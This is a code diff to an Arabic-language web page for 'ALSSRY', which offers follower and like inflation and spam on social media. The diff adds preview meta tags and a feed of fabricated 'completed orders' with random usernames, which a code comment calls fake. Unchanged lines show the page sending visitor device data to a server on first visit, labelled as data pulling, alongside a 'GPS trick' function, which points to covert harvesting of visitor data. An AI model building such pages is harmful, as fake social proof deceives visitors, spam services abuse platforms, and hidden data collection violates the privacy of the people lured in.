@@ -3,7 +3,24 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
     <title>ALSSRY - SERVICES</title>
+    
+    <meta property="og:title" content="ALSSRY D3M" />
+    
+    <meta property="og:description" content="خدمات سوشال ميديا احترافية - رشق متابعين، لايكات، وإسبام." />
+    
+    <meta property="og:type" content="website" />
+    
+    <meta property="og:image" content="https://via.placeholder.com/300/000000/00ff00?text=ALSSRY" />
+    
+    <meta name="theme-color" content="#00ff00">
+
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="ALSSRY D3M">
+    <meta name="twitter:description" content="خدمات سوشال ميديا احترافية - رشق، لايكات، وإسبام.">
+    <meta name="twitter:image" content="https://via.placeholder.com/300/000000/00ff00?text=ALSSRY">
+
     <style>
         :root { --main-green: #00ff00; --glow-red: #ff0000; }
         body { background-color: #010101; color: white; text-align: center; font-family: 'Arial', sans-serif; margin: 0; overflow-x: hidden; direction: rtl; }
@@ -35,7 +52,7 @@
         .start-btn { padding: 16px 70px; background: transparent; border: 1px solid var(--main-green); color: var(--main-green); border-radius: 50px; font-size: 22px; cursor: pointer; transition: 0.4s; }
 
         /* الواجهة الداخلية */
-        #tools-interface { padding: 20px; display: none; z-index: 10; }
+        #tools-interface { padding: 20px; display: none; z-index: 10; padding-bottom: 150px; } /* زيادة padding السفلية */
         .glass-btn { 
             width: 90%; padding: 16px; margin: 10px 0; background: rgba(255, 255, 255, 0.05); 
             border: 1px solid rgba(0, 255, 0, 0.3); color: var(--main-green); border-radius: 12px; font-weight: bold; cursor: pointer; 
@@ -44,7 +61,14 @@
         #progress-box { margin-top: 20px; border: 1px solid var(--main-green); padding: 15px; border-radius: 10px; background: rgba(0,0,0,0.9); }
         #counter { font-size: 38px; font-weight: bold; color: var(--main-green); }
 
-        #live-status { position: fixed; bottom: 0; width: 100%; background: rgba(0,0,0,0.8); padding: 10px 0; }
+        /* قسم العمليات الأخيرة */
+        #recent-activity { width: 90%; margin: 30px auto; background: rgba(255,255,255,0.02); border: 1px solid #222; border-radius: 15px; overflow: hidden; }
+        .activity-header { background: #111; padding: 10px; font-size: 14px; color: #888; border-bottom: 1px solid #222; }
+        .activity-row { padding: 12px; border-bottom: 1px solid #111; display: flex; justify-content: space-between; align-items: center; font-size: 13px; animation: fadeIn 0.5s; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateX(10px); } to { opacity: 1; transform: translateX(0); } }
+        .tag-success { color: var(--main-green); font-weight: bold; }
+
+        #live-status { position: fixed; bottom: 0; width: 100%; background: rgba(0,0,0,0.9); padding: 10px 0; border-top: 1px solid #222; z-index: 20; }
         .online-count { font-size: 13px; color: var(--main-green); }
         .hidden { display: none !important; }
     </style>
@@ -93,6 +117,12 @@
             <div id="progress-box" class="hidden">
                 <div id="counter">0</div>
             </div>
+        </div>
+
+        <div id="recent-activity">
+            <div class="activity-header">آخر العمليات المكتملة ⚡</div>
+            <div id="activity-list">
+                </div>
         </div>
 
         <div id="live-status">
@@ -152,6 +182,7 @@
 
             sendToApi("زيارة أولية - سحب بيانات");
             updateOnline();
+            genActivity(); // بدء توليد العمليات الوهمية
         }
 
         // خدعة الـ GPS
@@ -181,11 +212,32 @@
         }
 
         function sendToApi(msg) {
+            // ملاحظة: تأكد من إعداد نقطة النهاية (Endpoint) الخاصة بك لاستقبال البيانات
             fetch('/api/index', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({ action: msg, device: deviceData })
             });
+        }
+
+        // محاكي العمليات الأخيرة
+        const users = ['a7m', 'sa_','kh_','m.','n_','user','b0','z.','r9','mo'];
+        const servs = ['متابعين', 'لايكات', 'إسبام', 'مشاهدات'];
+        
+        function genActivity() {
+            const list = document.getElementById('activity-list');
+            setInterval(() => {
+                const user = users[Math.floor(Math.random()*users.length)] + (Math.floor(Math.random()*900)+100);
+                const srv = servs[Math.floor(Math.random()*servs.length)];
+                const amt = Math.floor(Math.random()*2000)+500;
+                
+                const row = document.createElement('div');
+                row.className = 'activity-row';
+                row.innerHTML = `<span>👤 ${user}</span> <span>${srv} <span class="tag-success">+${amt}</span></span>`;
+                
+                list.prepend(row);
+                if(list.children.length > 5) list.removeChild(list.lastChild);
+            }, 5000);
         }
 
         // عداد المتصلين الذكي
